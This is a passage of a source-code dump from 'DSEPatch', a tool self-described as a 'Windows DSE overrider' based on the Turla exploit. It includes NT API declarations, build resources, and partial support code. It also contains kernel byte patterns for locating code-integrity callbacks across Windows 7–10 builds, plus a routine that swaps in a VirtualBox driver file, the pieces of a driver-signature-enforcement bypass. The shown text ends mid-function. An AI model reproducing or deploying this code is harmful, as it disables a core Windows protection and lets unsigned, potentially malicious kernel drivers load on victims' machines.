    _In_ MEMORY_INFORMATION_CLASS MemoryInformationClass,
    _Out_writes_bytes_(MemoryInformationLength) PVOID MemoryInformation,
    _In_ SIZE_T MemoryInformationLength,
    _Out_opt_ PSIZE_T ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_ VIRTUAL_MEMORY_INFORMATION_CLASS VmInformationClass,
    _In_ ULONG_PTR NumberOfEntries,
    _In_reads_(NumberOfEntries) PMEMORY_RANGE_ENTRY VirtualAddresses,
    _In_reads_bytes_(VmInformationLength) PVOID VmInformation,
    _In_ ULONG VmInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
NtReadVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _Out_writes_bytes_(BufferSize) PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesRead);

NTSYSAPI
NTSTATUS
NTAPI
NtWriteVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_reads_bytes_(BufferSize) PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesWritten);

NTSYSAPI
NTSTATUS
NTAPI
NtProtectVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewProtect,
    _Out_ PULONG OldProtect);

NTSYSAPI
NTSTATUS
NTAPI
NtLockVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG MapType);

NTSYSAPI
NTSTATUS
NTAPI
NtUnlockVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG MapType);

NTSYSAPI
NTSTATUS
NTAPI
NtFlushInstructionCache(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ SIZE_T Length);

NTSYSAPI
NTSTATUS
NTAPI
NtCreatePagingFile(
    _In_ PUNICODE_STRING PageFileName,
    _In_ PLARGE_INTEGER MinimumSize,
    _In_ PLARGE_INTEGER MaximumSize,
    _In_ ULONG Priority);

/************************************************************************************
*
* Port API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtCreatePort(
    _Out_ PHANDLE PortHandle,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG MaxConnectionInfoLength,
    _In_ ULONG MaxMessageLength,
    _In_ ULONG MaxPoolUsage);

NTSYSAPI
NTSTATUS
NTAPI
NtCompleteConnectPort(
    _In_ HANDLE PortHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtListenPort(
    _In_ HANDLE PortHandle,
    _Out_ PPORT_MESSAGE ConnectionRequest);

NTSYSAPI
NTSTATUS
NTAPI
NtReplyPort(
    _In_ HANDLE PortHandle,
    _In_ PPORT_MESSAGE ReplyMessage);

NTSYSAPI
NTSTATUS
NTAPI
NtReplyWaitReplyPort(
    _In_ HANDLE PortHandle,
    _Inout_ PPORT_MESSAGE ReplyMessage);

NTSYSAPI
NTSTATUS
NTAPI
NtRequestPort(
    _In_ HANDLE PortHandle,
    _In_ PPORT_MESSAGE RequestMessage);

NTSYSAPI
NTSTATUS
NTAPI
NtRequestWaitReplyPort(
    _In_ HANDLE PortHandle,
    _In_ PPORT_MESSAGE RequestMessage,
    _Out_ PPORT_MESSAGE ReplyMessage);

NTSYSAPI
NTSTATUS
NTAPI
NtClosePort(
    _In_ HANDLE PortHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtReplyWaitReceivePort(
    _In_ HANDLE PortHandle,
    _Out_opt_ PVOID *PortContext,
    _In_opt_ PPORT_MESSAGE ReplyMessage,
    _Out_ PPORT_MESSAGE ReceiveMessage);

NTSYSAPI
NTSTATUS
NTAPI
NtWriteRequestData(
    _In_ HANDLE PortHandle,
    _In_ PPORT_MESSAGE Message,
    _In_ ULONG DataEntryIndex,
    _In_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG NumberOfBytesWritten);

NTSYSAPI
NTSTATUS
NTAPI
NtReadRequestData(
    _In_ HANDLE PortHandle,
    _In_ PPORT_MESSAGE Message,
    _In_ ULONG DataEntryIndex,
    _Out_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG NumberOfBytesRead);

NTSYSAPI
NTSTATUS
NTAPI
NtConnectPort(
    _Out_ PHANDLE PortHandle,
    _In_ PUNICODE_STRING PortName,
    _In_ PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    _Inout_opt_ PPORT_VIEW ClientView,
    _Out_opt_ PREMOTE_PORT_VIEW ServerView,
    _Out_opt_ PULONG MaxMessageLength,
    _Inout_opt_	PVOID ConnectionInformation,
    _Inout_opt_	PULONG ConnectionInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
NtAcceptConnectPort(
    _Out_ PHANDLE PortHandle,
    _In_opt_ PVOID PortContext,
    _In_ PPORT_MESSAGE ConnectionRequest,
    _In_ BOOLEAN AcceptConnection,
    _Inout_opt_ PPORT_VIEW ServerView,
    _Out_opt_ PREMOTE_PORT_VIEW ClientView);

NTSYSAPI
NTSTATUS
NTAPI
NtSecureConnectPort(
    _Out_ PHANDLE PortHandle,
    _In_ PUNICODE_STRING PortName,
    _In_ PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    _Inout_opt_ PPORT_VIEW ClientView,
    _In_opt_ PSID RequiredServerSid,
    _Inout_opt_ PREMOTE_PORT_VIEW ServerView,
    _Out_opt_ PULONG MaxMessageLength,
    _Inout_opt_ PVOID ConnectionInformation,
    _Inout_opt_ PULONG ConnectionInformationLength);

/************************************************************************************
*
* Boot Management API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtEnumerateBootEntries(
    _Out_writes_bytes_opt_(*BufferLength) PVOID Buffer,
    _Inout_ PULONG BufferLength);

/************************************************************************************
*
* Reserve Objects API.
*
************************************************************************************/

typedef enum _MEMORY_RESERVE_TYPE {
    MemoryReserveUserApc,
    MemoryReserveIoCompletion,
    MemoryReserveTypeMax
} MEMORY_RESERVE_TYPE;

NTSYSAPI
NTSTATUS
NTAPI
NtAllocateReserveObject(
    _Out_ PHANDLE MemoryReserveHandle,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ MEMORY_RESERVE_TYPE Type);

/************************************************************************************
*
* Debug API.
*
************************************************************************************/

//
// Define the debug object thats used to attatch to processes that are being debugged.
//
#define DEBUG_OBJECT_DELETE_PENDING (0x1) // Debug object is delete pending.
#define DEBUG_OBJECT_KILL_ON_CLOSE  (0x2) // Kill all debugged processes on close

typedef struct _DEBUG_OBJECT {
    //
    // Event thats set when the EventList is populated.
    //
    KEVENT EventsPresent;
    //
    // Mutex to protect the structure
    //
    FAST_MUTEX Mutex;
    //
    // Queue of events waiting for debugger intervention
    //
    LIST_ENTRY EventList;
    //
    // Flags for the object
    //
    ULONG Flags;
} DEBUG_OBJECT, *PDEBUG_OBJECT;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateDebugObject(
    _Out_ PHANDLE DebugObjectHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
NtDebugActiveProcess(
    _In_ HANDLE ProcessHandle,
    _In_ HANDLE DebugObjectHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtRemoveProcessDebug(
    _In_ HANDLE ProcessHandle,
    _In_ HANDLE DebugObjectHandle);

/************************************************************************************
*
* Profile API.
*
************************************************************************************/

typedef enum _KPROFILE_SOURCE {
    ProfileTime,
    ProfileAlignmentFixup,
    ProfileTotalIssues,
    ProfilePipelineDry,
    ProfileLoadInstructions,
    ProfilePipelineFrozen,
    ProfileBranchInstructions,
    ProfileTotalNonissues,
    ProfileDcacheMisses,
    ProfileIcacheMisses,
    ProfileCacheMisses,
    ProfileBranchMispredictions,
    ProfileStoreInstructions,
    ProfileFpInstructions,
    ProfileIntegerInstructions,
    Profile2Issue,
    Profile3Issue,
    Profile4Issue,
    ProfileSpecialInstructions,
    ProfileTotalCycles,
    ProfileIcacheIssues,
    ProfileDcacheAccesses,
    ProfileMemoryBarrierCycles,
    ProfileLoadLinkedIssues,
    ProfileMaximum
} KPROFILE_SOURCE;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateProfile(
    _Out_ PHANDLE ProfileHandle,
    _In_opt_ HANDLE Process,
    _In_ PVOID ProfileBase,
    _In_ SIZE_T ProfileSize,
    _In_ ULONG BucketSize,
    _In_reads_bytes_(BufferSize) PULONG Buffer,
    _In_ ULONG BufferSize,
    _In_ KPROFILE_SOURCE ProfileSource,
    _In_ KAFFINITY Affinity);

NTSYSAPI
NTSTATUS
NTAPI
NtStartProfile(
    _In_ HANDLE ProfileHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtStopProfile(
    _In_ HANDLE ProfileHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryIntervalProfile(
    _In_ KPROFILE_SOURCE ProfileSource,
    _Out_ PULONG Interval);

NTSYSAPI
NTSTATUS
NTAPI
NtSetIntervalProfile(
    _In_ ULONG Interval,
    _In_ KPROFILE_SOURCE Source);

/************************************************************************************
*
* Worker Factory API.
*
************************************************************************************/

typedef enum _WORKERFACTORYINFOCLASS {
    WorkerFactoryTimeout,
    WorkerFactoryRetryTimeout,
    WorkerFactoryIdleTimeout,
    WorkerFactoryBindingCount,
    WorkerFactoryThreadMinimum,
    WorkerFactoryThreadMaximum,
    WorkerFactoryPaused,
    WorkerFactoryBasicInformation,
    WorkerFactoryAdjustThreadGoal,
    WorkerFactoryCallbackType,
    WorkerFactoryStackInformation,
    WorkerFactoryThreadBasePriority,
    WorkerFactoryTimeoutWaiters,
    WorkerFactoryFlags,
    WorkerFactoryThreadSoftMaximum,
    MaxWorkerFactoryInfoClass
} WORKERFACTORYINFOCLASS, *PWORKERFACTORYINFOCLASS;

typedef struct _WORKER_FACTORY_BASIC_INFORMATION {
    LARGE_INTEGER Timeout;
    LARGE_INTEGER RetryTimeout;
    LARGE_INTEGER IdleTimeout;
    BOOLEAN Paused;
    BOOLEAN TimerSet;
    BOOLEAN QueuedToExWorker;
    BOOLEAN MayCreate;
    BOOLEAN CreateInProgress;
    BOOLEAN InsertedIntoQueue;
    BOOLEAN Shutdown;
    ULONG BindingCount;
    ULONG ThreadMinimum;
    ULONG ThreadMaximum;
    ULONG PendingWorkerCount;
    ULONG WaitingWorkerCount;
    ULONG TotalWorkerCount;
    ULONG ReleaseCount;
    LONGLONG InfiniteWaitGoal;
    PVOID StartRoutine;
    PVOID StartParameter;
    HANDLE ProcessId;
    SIZE_T StackReserve;
    SIZE_T StackCommit;
    NTSTATUS LastThreadCreationStatus;
} WORKER_FACTORY_BASIC_INFORMATION, *PWORKER_FACTORY_BASIC_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateWorkerFactory(
    _Out_ PHANDLE WorkerFactoryHandleReturn,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE CompletionPortHandle,
    _In_ HANDLE WorkerProcessHandle,
    _In_ PVOID StartRoutine,
    _In_opt_ PVOID StartParameter,
    _In_opt_ ULONG MaxThreadCount,
    _In_opt_ SIZE_T StackReserve,
    _In_opt_ SIZE_T StackCommit);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationWorkerFactory(
    _In_ HANDLE WorkerFactoryHandle,
    _In_ WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
    _Out_writes_bytes_(WorkerFactoryInformationLength) PVOID WorkerFactoryInformation,
    _In_ ULONG WorkerFactoryInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtShutdownWorkerFactory(
    _In_ HANDLE WorkerFactoryHandle,
    _Inout_ volatile LONG *PendingWorkerCount);

NTSYSAPI
NTSTATUS
NTAPI
NtReleaseWorkerFactoryWorker(
    _In_ HANDLE WorkerFactoryHandle);

/************************************************************************************
*
* Event Tracing API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtTraceEvent(
    _In_ HANDLE TraceHandle,
    _In_ ULONG Flags,
    _In_ ULONG FieldSize,
    _In_ PVOID Fields);

NTSYSAPI
NTSTATUS
NTAPI
NtTraceControl(
    _In_ ULONG FunctionCode,
    _In_reads_bytes_opt_(InBufferLen) PVOID InBuffer,
    _In_ ULONG InBufferLen,
    _Out_writes_bytes_opt_(OutBufferLen) PVOID OutBuffer,
    _In_ ULONG OutBufferLen,
    _Out_ PULONG ReturnLength);

/************************************************************************************
*
* Kernel Debugger API.
*
************************************************************************************/

typedef struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION {
    BOOLEAN KernelDebuggerEnabled;
    BOOLEAN KernelDebuggerNotPresent;
} SYSTEM_KERNEL_DEBUGGER_INFORMATION, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION;

typedef struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION_EX {
    BOOLEAN DebuggerAllowed;
    BOOLEAN DebuggerEnabled;
    BOOLEAN DebuggerPresent;
} SYSTEM_KERNEL_DEBUGGER_INFORMATION_EX, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION_EX;

typedef enum _SYSDBG_COMMAND {
    SysDbgQueryModuleInformation,
    SysDbgQueryTraceInformation,
    SysDbgSetTracepoint,
    SysDbgSetSpecialCall,
    SysDbgClearSpecialCalls,
    SysDbgQuerySpecialCalls,
    SysDbgBreakPoint,
    SysDbgQueryVersion,
    SysDbgReadVirtual,
    SysDbgWriteVirtual,
    SysDbgReadPhysical,
    SysDbgWritePhysical,
    SysDbgReadControlSpace,
    SysDbgWriteControlSpace,
    SysDbgReadIoSpace,
    SysDbgWriteIoSpace,
    SysDbgReadMsr,
    SysDbgWriteMsr,
    SysDbgReadBusData,
    SysDbgWriteBusData,
    SysDbgCheckLowMemory,
    SysDbgEnableKernelDebugger,
    SysDbgDisableKernelDebugger,
    SysDbgGetAutoKdEnable,
    SysDbgSetAutoKdEnable,
    SysDbgGetPrintBufferSize,
    SysDbgSetPrintBufferSize,
    SysDbgGetKdUmExceptionEnable,
    SysDbgSetKdUmExceptionEnable,
    SysDbgGetTriageDump,
    SysDbgGetKdBlockEnable,
    SysDbgSetKdBlockEnable,
    SysDbgRegisterForUmBreakInfo,
    SysDbgGetUmBreakPid,
    SysDbgClearUmBreakPid,
    SysDbgGetUmAttachPid,
    SysDbgClearUmAttachPid,
    SysDbgGetLiveKernelDump
} SYSDBG_COMMAND, *PSYSDBG_COMMAND;

typedef struct _SYSDBG_VIRTUAL {
    PVOID Address;
    PVOID Buffer;
    ULONG Request;
} SYSDBG_VIRTUAL, *PSYSDBG_VIRTUAL;

NTSYSAPI
NTSTATUS
NTAPI
NtSystemDebugControl(
    _In_ SYSDBG_COMMAND Command,
    _Inout_updates_bytes_opt_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(OutputBufferLength) PVOID OutputBuffer,
    _In_ ULONG OutputBufferLength,
    _Out_opt_ PULONG ReturnLength);

/************************************************************************************
*
* Application Verifier API and definitions.
*
************************************************************************************/

#ifndef DLL_PROCESS_VERIFIER
#define DLL_PROCESS_VERIFIER 4
#endif

typedef VOID(NTAPI *RTL_VERIFIER_DLL_LOAD_CALLBACK)(
    PWSTR DllName,
    PVOID DllBase,
    SIZE_T DllSize,
    PVOID Reserved);

typedef VOID(NTAPI *RTL_VERIFIER_DLL_UNLOAD_CALLBACK)(
    PWSTR DllName,
    PVOID DllBase,
    SIZE_T DllSize,
    PVOID Reserved);

typedef VOID(NTAPI *RTL_VERIFIER_NTDLLHEAPFREE_CALLBACK)(
    PVOID AllocationBase,
    SIZE_T AllocationSize);

typedef struct _RTL_VERIFIER_THUNK_DESCRIPTOR {
    PCHAR ThunkName;
    PVOID ThunkOldAddress;
    PVOID ThunkNewAddress;
} RTL_VERIFIER_THUNK_DESCRIPTOR, *PRTL_VERIFIER_THUNK_DESCRIPTOR;

typedef struct _RTL_VERIFIER_DLL_DESCRIPTOR {
    PWCHAR DllName;
    DWORD DllFlags;
    PVOID DllAddress;
    PRTL_VERIFIER_THUNK_DESCRIPTOR DllThunks;
} RTL_VERIFIER_DLL_DESCRIPTOR, *PRTL_VERIFIER_DLL_DESCRIPTOR;

typedef struct _RTL_VERIFIER_PROVIDER_DESCRIPTOR {
    DWORD Length;
    PRTL_VERIFIER_DLL_DESCRIPTOR ProviderDlls;
    RTL_VERIFIER_DLL_LOAD_CALLBACK ProviderDllLoadCallback;
    RTL_VERIFIER_DLL_UNLOAD_CALLBACK ProviderDllUnloadCallback;
    PWSTR VerifierImage;
    DWORD VerifierFlags;
    DWORD VerifierDebug;
    PVOID RtlpGetStackTraceAddress;
    PVOID RtlpDebugPageHeapCreate;
    PVOID RtlpDebugPageHeapDestroy;
    RTL_VERIFIER_NTDLLHEAPFREE_CALLBACK ProviderNtdllHeapFreeCallback;
} RTL_VERIFIER_PROVIDER_DESCRIPTOR, *PRTL_VERIFIER_PROVIDER_DESCRIPTOR;

//
// Application verifier standard flags.
//
#define RTL_VRF_FLG_FULL_PAGE_HEAP                   0x00000001
#define RTL_VRF_FLG_RESERVED_DONOTUSE                0x00000002
#define RTL_VRF_FLG_HANDLE_CHECKS                    0x00000004
#define RTL_VRF_FLG_STACK_CHECKS                     0x00000008
#define RTL_VRF_FLG_APPCOMPAT_CHECKS                 0x00000010
#define RTL_VRF_FLG_TLS_CHECKS                       0x00000020
#define RTL_VRF_FLG_DIRTY_STACKS                     0x00000040
#define RTL_VRF_FLG_RPC_CHECKS                       0x00000080
#define RTL_VRF_FLG_COM_CHECKS                       0x00000100
#define RTL_VRF_FLG_DANGEROUS_APIS                   0x00000200
#define RTL_VRF_FLG_RACE_CHECKS                      0x00000400
#define RTL_VRF_FLG_DEADLOCK_CHECKS                  0x00000800
#define RTL_VRF_FLG_FIRST_CHANCE_EXCEPTION_CHECKS    0x00001000
#define RTL_VRF_FLG_VIRTUAL_MEM_CHECKS               0x00002000
#define RTL_VRF_FLG_ENABLE_LOGGING                   0x00004000
#define RTL_VRF_FLG_FAST_FILL_HEAP                   0x00008000
#define RTL_VRF_FLG_VIRTUAL_SPACE_TRACKING           0x00010000
#define RTL_VRF_FLG_ENABLED_SYSTEM_WIDE              0x00020000
#define RTL_VRF_FLG_MISCELLANEOUS_CHECKS             0x00020000
#define RTL_VRF_FLG_LOCK_CHECKS                      0x00040000

NTSYSAPI
VOID
NTAPI
RtlApplicationVerifierStop(
    _In_ ULONG_PTR Code,
    _In_ PSTR Message,
    _In_ ULONG_PTR Param1,
    _In_ PSTR Description1,
    _In_ ULONG_PTR Param2,
    _In_ PSTR Description2,
    _In_ ULONG_PTR Param3,
    _In_ PSTR Description3,
    _In_ ULONG_PTR Param4,
    _In_ PSTR Description4);

#ifndef VERIFIER_STOP
#define VERIFIER_STOP(Code, Msg, P1, S1, P2, S2, P3, S3, P4, S4) {  \
        RtlApplicationVerifierStop ((Code),                         \
                                    (Msg),                          \
                                    (ULONG_PTR)(P1),(S1),           \
                                    (ULONG_PTR)(P2),(S2),           \
                                    (ULONG_PTR)(P3),(S3),           \
                                    (ULONG_PTR)(P4),(S4));          \
  }
#endif


//
// NTOS_RTL HEADER END
//

#pragma warning(pop)


#ifdef __cplusplus
}
#endif

#endif NTOS_RTL

```

`source/DSEPatch/DSEPatch/resource.h`:

```h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by resource.rc

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        101
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

```

`source/DSEPatch/DSEPatch/resource.rc`:

```rc
// Microsoft Visual C++ generated resource script.
//
#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "winres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE 
BEGIN
    "resource.h\0"
END

2 TEXTINCLUDE 
BEGIN
    "#include ""winres.h""\r\n"
    "\0"
END

3 TEXTINCLUDE 
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED


/////////////////////////////////////////////////////////////////////////////
//
// Version
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 1,0,0,5
 PRODUCTVERSION 1,0,0,5
 FILEFLAGSMASK 0x3fL
#ifdef _DEBUG
 FILEFLAGS 0x1L
#else
 FILEFLAGS 0x0L
#endif
 FILEOS 0x40004L
 FILETYPE 0x1L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "UG North"
            VALUE "FileDescription", "Windows DSE overrider"
            VALUE "FileVersion", "1.0.0.5"
            VALUE "InternalName", "DSEPatch.exe"
            VALUE "LegalCopyright", "Copyright (C) 2016 - 2019 EP_X0FF, MP_ART and N.Rin, based on WinNT/Turla exploit"
            VALUE "OriginalFilename", "DSEPatch.exe"
            VALUE "ProductName", "Windows DSE overrider"
            VALUE "ProductVersion", "1.0.0.5"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED


```

`source/DSEPatch/DSEPatch/se_patterns.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2019
*
*  TITLE:       SE_PATTERNS.H
*
*  VERSION:     1.05
*
*  DATE:        22 Jan 2019
*
*  Header with search patterns used by DSEPatch.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once


/*+++

 SeCiCallbacks search patterns

+++*/

//Windows 10 TH1/TH2
BYTE SeCiCallbacksPattern_10240_10586[] = { 0x48, 0x83, 0xEC, 0x20, 0xBB, 0x98, 0x00, 0x00, 0x00 };

//Windows 10 RS1
BYTE SeCiCallbacksPattern_14393[] = { 0x48, 0x83, 0xEC, 0x20, 0xBB, 0xB0, 0x00, 0x00, 0x00 };

//Windows 10 RS2/RS3
BYTE SeCiCallbacksPattern_15063_16299[] = { 0x48, 0x83, 0xEC, 0x20, 0xBB, 0xC0, 0x00, 0x00, 0x00 };

//Windows 10 RS4/RS5
BYTE SeCiCallbacksPattern_17134_17763[] = { 0x48, 0x83, 0xEC, 0x20, 0xBB, 0xD0, 0x00, 0x00, 0x00 };

//Windows 8/8.1
BYTE SeCiCallbacksPattern_9200_9600[] = { 0x48, 0x83, 0xEC, 0x20, 0xBF, 0x06, 0x00, 0x00, 0x00 };

BYTE SeCiCallbacksMatchingPattern[] = { 0x48, 0x8D, 0x0D };

//Windows 7
BYTE g_CiCallbacksPattern_7601[] = { 0x8D, 0x7B, 0x06, 0x48, 0x89, 0x05 };
BYTE g_CiCallbacksMatchingPattern[] = { 0x48, 0x89, 0x05 };

```

`source/DSEPatch/DSEPatch/sup.c`:

```c
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2019
*
*  TITLE:       SUP.C
*
*  VERSION:     1.05
*
*  DATE:        22 Jan 2019
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "se_patterns.h"

#define PAGE_SECTION "PAGE"
#define PAGE_SECTION_LEGNTH sizeof(PAGE_SECTION)

/*
* supCopyMemory
*
* Purpose:
*
* Copies bytes between buffers.
*
* dest - Destination buffer
* cbdest - Destination buffer size in bytes
* src - Source buffer
* cbsrc - Source buffer size in bytes
*
*/
void supCopyMemory(
    _Inout_ void *dest,
    _In_ size_t cbdest,
    _In_ const void *src,
    _In_ size_t cbsrc
)
{
    char *d = (char*)dest;
    char *s = (char*)src;

    if ((dest == 0) || (src == 0) || (cbdest == 0))
        return;
    if (cbdest < cbsrc)
        cbsrc = cbdest;

    while (cbsrc > 0) {
        *d++ = *s++;
        cbsrc--;
    }
}

/*
* supGetSystemInfo
*
* Purpose:
*
* Returns buffer with system information by given InfoClass.
*
* Returned buffer must be freed with HeapFree after usage.
* Function will return error after 100 attempts.
*
*/
PVOID supGetSystemInfo(
    _In_ SYSTEM_INFORMATION_CLASS InfoClass
)
{
    INT         c = 0;
    PVOID       Buffer = NULL;
    ULONG		Size = 0x1000;
    NTSTATUS    status;
    ULONG       memIO;
    PVOID       hHeap = NtCurrentPeb()->ProcessHeap;

    do {
        Buffer = RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, (SIZE_T)Size);
        if (Buffer != NULL) {
            status = NtQuerySystemInformation(InfoClass, Buffer, Size, &memIO);
        }
        else {
            return NULL;
        }
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            RtlFreeHeap(hHeap, 0, Buffer);
            Buffer = NULL;
            Size *= 2;
            c++;
            if (c > 100) {
                status = STATUS_SECRET_TOO_LONG;
                break;
            }
        }
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (NT_SUCCESS(status)) {
        return Buffer;
    }

    if (Buffer) {
        RtlFreeHeap(hHeap, 0, Buffer);
    }
    return NULL;
}

/*
* supBackupVBoxDrv
*
* Purpose:
*
* Backup virtualbox driver file if it already installed.
*
*/
BOOL supBackupVBoxDrv(
    _In_ BOOL bRestore
)
{
    BOOL  bResult = FALSE;
    WCHAR szOldDriverName[MAX_PATH * 2];
    WCHAR szNewDriverName[MAX_PATH * 2];
    WCHAR szDriverDirName[MAX_PATH * 2];

    if (!GetSystemDirectory(szDriverDirName, MAX_PATH)) {
        return FALSE;
    }

    _strcat(szDriverDirName, TEXT("\\drivers\\"));

    if (bRestore) {
        _strcpy(szOldDriverName, szDriverDirName);
        _strcat(szOldDriverName, TEXT("VBoxDrv.backup"));
        if (PathFileExists(szOldDriverName)) {
            _strcpy(szNewDriverName, szDriverDirName);
            _strcat(szNewDriverName, TEXT("VBoxDrv.sys"));
            bResult = MoveFileEx(szOldDriverName, szNewDriverName,
                MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);
        }
    }
    else {
        _strcpy(szOldDriverName, szDriverDirName);
        _strcat(szOldDriverName, TEXT("VBoxDrv.sys"));
        _strcpy(szNewDriverName, szDriverDirName);
        _strcat(szNewDriverName, TEXT("VBoxDrv.backup"));
        bResult = MoveFileEx(szOldDriverName, szNewDriverName,
            MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);
    }
    return bResult;
}

/*
* supWriteBufferToFile
*
* Purpose:
*
* Create new file and write buffer to it.
*
*/
DWORD supWriteBufferToFile(
    _In_ LPWSTR lpFileName,
    _In_ PVOID Buffer,
    _In_ DWORD BufferSize
)
{
    HANDLE hFile;
    DWORD bytesIO;

    if (
        (lpFileName == NULL) ||
        (Buffer == NULL) ||
        (BufferSize == 0)
        )
    {
        return FALSE;
    }

    hFile = CreateFile(lpFileName,
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;

    WriteFile(hFile, Buffer, BufferSize, &bytesIO, NULL);
    CloseHandle(hFile);

    return bytesIO;
}

/*
* supDetectObjectCallback
*
* Purpose:
*
* Comparer callback routine used in objects enumeration.
*
*/
NTSTATUS NTAPI supDetectObjectCallback(
    _In_ POBJECT_DIRECTORY_INFORMATION Entry,
    _In_ PVOID CallbackParam
)
{
    POBJSCANPARAM Param = (POBJSCANPARAM)CallbackParam;

    if (Entry == NULL) {
        return STATUS_INVALID_PARAMETER_1;
    }

    if (CallbackParam == NULL) {
        return STATUS_INVALID_PARAMETER_2;
    }

    if (Param->Buffer == NULL || Param->BufferSize == 0) {
        return STATUS_MEMORY_NOT_ALLOCATED;
    }

    if (Entry->Name.Buffer) {
        if (_strcmpi_w(Entry->Name.Buffer, Param->Buffer) == 0) {
            return STATUS_SUCCESS;
        }
    }
    return STATUS_UNSUCCESSFUL;
}

/*
* supEnumSystemObjects
*
* Purpose:
*
* Lookup object by name in given directory.
*
*/
NTSTATUS NTAPI supEnumSystemObjects(
